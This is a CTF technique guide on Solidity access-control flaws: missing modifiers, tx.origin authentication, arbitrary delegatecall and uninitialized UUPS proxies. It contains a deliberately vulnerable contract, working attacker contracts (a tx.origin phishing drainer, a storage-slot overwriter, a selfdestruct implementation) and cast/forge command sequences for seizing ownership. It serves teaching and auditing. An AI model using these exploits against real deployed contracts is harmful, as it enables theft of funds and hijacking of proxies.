---
title: "Access Control Failures - Missing Modifiers, tx.origin, Uninitialized Proxies"
category: blockchain
subcategory: access-control
type: technique
tags: [blockchain, access-control, solidity, tx-origin, onlyowner, modifier, initializer, uninitialized-proxy, delegatecall, selfdestruct, uups, ownable, phishing, evm, foundry, cast, authorization]
difficulty: easy
summary: "The privileged function is reachable: no modifier, tx.origin auth, an open initializer, or a delegatecall you control."
when_to_use:
  - "A function changes owner/mints/withdraws and you cannot see a modifier on it"
  - "Auth uses tx.origin instead of msg.sender"
  - "The contract is a proxy or uses Initializable"
  - "Anything routes a user-supplied address into delegatecall"
tools: [foundry, cast, slither, forge]
related: [delegatecall-storage-collision, attacker-contract-patterns, solidity-vuln-checklist, setup-and-workflow]
---

## TL;DR

The most common CTF Solidity bug is not exotic maths, it is that the privileged entry point is
simply callable. Check every state-mutating function for a modifier, check that the modifier
actually reverts, check that initializers cannot be re-run, and check what `delegatecall` targets.

## Recognise it

- `function setOwner(address o) public { owner = o; }` - no `onlyOwner`.
- A modifier that logs but does not `require`: `modifier onlyOwner() { emit Check(); _; }`.
- `require(tx.origin == owner)` - auth that any contract the owner touches can forward.
- `function initialize(address o) public { owner = o; }` with no `initializer` modifier, or an
  `_initialized` flag that is never set on the *implementation* contract.
- A `public`/`external` function that should be `internal` (`_mint`, `_transferOwnership`).
- `delegatecall(abi.encodeWithSignature(...))` where the target address is a parameter.
- `onlyOwner` where `owner` is set in the constructor but the contract was deployed by a factory
  via `CREATE`/`CREATE2` and the constructor set `owner = msg.sender` = the factory (or `tx.origin`).
- Role systems where `DEFAULT_ADMIN_ROLE` is granted to `address(0)` or never granted (then
  `grantRole` may be callable by the zero-admin path in buggy forks).

## Theory

### `tx.origin` vs `msg.sender`

- `msg.sender` = the immediate caller (contract or EOA).
- `tx.origin` = the EOA that signed the transaction, constant for the whole call tree.

So `require(tx.origin == owner)` means: **any contract the owner ever calls can call you as the
owner**. In CTFs the "owner" is usually a bot/oracle that calls your contract, or the challenge
literally makes the setup call you. This is also the reason `tx.origin == msg.sender` is used as
(a broken) "is this an EOA" check - broken because during a contract's *constructor* the code size
is zero, so `extcodesize`-based checks pass too, but `tx.origin == msg.sender` does hold only for
direct EOA calls; the CTF twist is usually that you need to *defeat* it, not satisfy it.

### Uninitialized proxy / implementation

With the OpenZeppelin transparent or UUPS proxy pattern, constructors do not run for the proxy's
storage, so an `initialize()` function plays the role of a constructor. Two failure modes:

1. **The proxy was deployed but `initialize()` was never called** - you call it and become owner.
2. **The implementation contract itself was never initialized.** It has its own storage. You call
   `initialize()` directly on the implementation, become its owner, and then (UUPS only) call
   `upgradeToAndCall()` on the *implementation*, whose `_authorizeUpgrade` passes because you are
   owner. Because UUPS puts the upgrade logic in the implementation, a `delegatecall` from the
   implementation to your contract can `selfdestruct` it, bricking every proxy that points at it -
   the Parity wallet class of bug. (Post-Cancun, `SELFDESTRUCT` only deletes code if the contract
   was created in the same transaction, so on modern chains this becomes "hijack" rather than
   "brick"; CTFs often pin an older EVM version.)

### `delegatecall` to attacker code

`delegatecall` runs the callee's code with **your** storage, `msg.sender` and `msg.value`.
If the callee address is attacker-supplied, you own the contract completely: write any slot,
including the `owner` slot. See `delegatecall-storage-collision`.

## Attack

1. `cast interface` / read the source; list every function that writes to a privileged variable.
2. For each, ask: what stops me? Is the modifier present, does it revert, is the comparison right?
3. For proxies: read the EIP-1967 implementation slot, then try `initialize()` on both the proxy and
   the implementation.
4. For `tx.origin`: get the owner to call *your* contract. In a CTF this means the challenge has a
   "ping the bot" function, a `receive()` on the owner, or you phish via a token callback.
5. Confirm with `cast call` (dry run) before you `cast send`.

## Code

### Vulnerable set

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

contract Vulnerable {
    address public owner;
    uint256 public constant PRIZE = 1 ether;
    mapping(address => uint256) public balances;

    constructor() payable {
        owner = msg.sender;
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "not owner");
        _;
    }

    // BUG 1: no modifier at all
    function setOwner(address newOwner) public {
        owner = newOwner;
    }

    // BUG 2: tx.origin auth -- forwardable
    function withdrawAll(address payable to) public {
        require(tx.origin == owner, "not owner");
        to.transfer(address(this).balance);
    }

    // BUG 3: arbitrary delegatecall
    function execute(address target, bytes calldata data) public {
        (bool ok, ) = target.delegatecall(data);
        require(ok, "call failed");
    }

    // BUG 4: should have been internal
    function _credit(address who, uint256 amount) public {
        balances[who] += amount;
    }

    receive() external payable {}
}
```

### Attacker for the `tx.origin` bug

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IVulnerable {
    function withdrawAll(address payable to) external;
}

/// The owner must be induced to call this contract in any way at all --
/// a plain ETH transfer to it is enough, because receive() fires.
contract TxOriginPhish {
    IVulnerable public immutable victim;
    address payable public immutable attacker;

    constructor(address _victim, address payable _attacker) {
        victim = IVulnerable(_victim);
        attacker = _attacker;
    }

    receive() external payable {
        victim.withdrawAll(attacker);
    }

    fallback() external payable {
        victim.withdrawAll(attacker);
    }
}
```

### Attacker for the arbitrary-`delegatecall` bug

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/// Layout is chosen so that slot 0 of THIS contract lines up with `owner`
/// (slot 0) of Vulnerable, because delegatecall uses the caller's storage.
contract StorageWriter {
    address public slot0;   // aligns with Vulnerable.owner

    function takeover(address newOwner) external {
        slot0 = newOwner;
    }
}
```

Driving it:

```bash
# 1) deploy the writer
WRITER=$(forge create src/StorageWriter.sol:StorageWriter \
  --rpc-url "$RPC_URL" --private-key "$PRIVATE_KEY" --json | jq -r .deployedTo)

# 2) delegatecall into it, overwriting slot 0 = owner
CALLDATA=$(cast calldata "takeover(address)" "$ME")
cast send "$TARGET" "execute(address,bytes)" "$WRITER" "$CALLDATA" \
  --rpc-url "$RPC_URL" --private-key "$PRIVATE_KEY"

# 3) verify
cast call "$TARGET" "owner()(address)" --rpc-url "$RPC_URL"
```

### Uninitialized UUPS implementation takeover

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IUUPS {
    function initialize(address owner_) external;
    function upgradeToAndCall(address newImplementation, bytes calldata data) external payable;
    function owner() external view returns (address);
}

/// Malicious "implementation" whose only job is to run arbitrary code in the
/// context of whatever delegatecalls into it.
contract Evil {
    function detonate(address payable to) external {
        selfdestruct(to);
    }

    // UUPS requires the new implementation to be upgrade-safe; a no-op satisfies it
    function proxiableUUID() external pure returns (bytes32) {
        return 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;
    }
}
```

```bash
# find the implementation behind a proxy
IMPL=$(cast storage "$PROXY" \
  0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc --rpc-url "$RPC_URL")
IMPL=$(cast parse-bytes32-address "$IMPL")

# is the implementation itself uninitialized? (OZ stores _initialized at slot 0, byte 0)
cast storage "$IMPL" 0 --rpc-url "$RPC_URL"

# claim it
cast send "$IMPL" "initialize(address)" "$ME" --rpc-url "$RPC_URL" --private-key "$PRIVATE_KEY"
cast call "$IMPL" "owner()(address)" --rpc-url "$RPC_URL"
```

## Variants & pitfalls

- **Modifier applied to the wrong function**: `onlyOwner` on the view getter, not the setter.
- **`_` missing in a modifier body** means the function body never runs (DoS, not bypass); `_`
  placed before the check means the body runs *before* the check.
- **`require(msg.sender == owner || owner == address(0))`** - if `owner` was never set, everyone
  passes.
- **Signature-gated admin**: see `signature-replay-malleability`.
- **`onlyEOA` guards**: `require(msg.sender == tx.origin)` blocks contracts, but **not** code running
  in a constructor if the check is `extcodesize(msg.sender) == 0`; see `attacker-contract-patterns`.
- **`Ownable2Step`**: `transferOwnership` only stages; you must also call `acceptOwnership`.
- **Re-initialization**: OZ v5 `_initialized` is a `uint64`; `reinitializer(n)` for any `n` greater
  than the current value is still callable if a public function exposes it.
- **`selfdestruct` post-Cancun (EIP-6780)** only sends the balance unless it happens in the creation
  transaction. Check the challenge's `evm_version` in `foundry.toml` before relying on bricking.
- **Factory-owned contracts**: `owner == factoryAddress`. Then look for a function on the factory
  that forwards calls - that is your authenticated path.

## Tools

- `slither . --detect suicidal,arbitrary-send-eth,tx-origin,unprotected-upgrade`
- `cast interface <addr>` / `cast 4byte-decode` to enumerate the surface without source.
- `forge inspect <C> methods` to list all selectors and their mutability.

## References

- Solidity docs: "Security Considerations - tx.origin".
- OpenZeppelin `Initializable` / `UUPSUpgradeable` source comments on `_disableInitializers()`.
